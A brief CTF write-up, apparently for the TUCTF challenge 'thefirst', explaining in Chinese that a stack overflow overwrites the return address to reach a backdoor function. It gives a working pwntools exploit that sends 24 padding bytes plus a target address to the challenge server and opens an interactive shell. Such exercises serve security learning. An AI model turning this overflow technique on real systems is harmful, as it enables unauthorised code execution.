### thefirst

> [附件](./thefirst)

溢出覆盖返回地址跳转到后门函数

[Exploit script:](./tf.py)

```python
from pwn import *

p = remote('chal.tuctf.com',30508)

p.sendline('A'*24+p32(0x80491F6))

p.interactive()
```

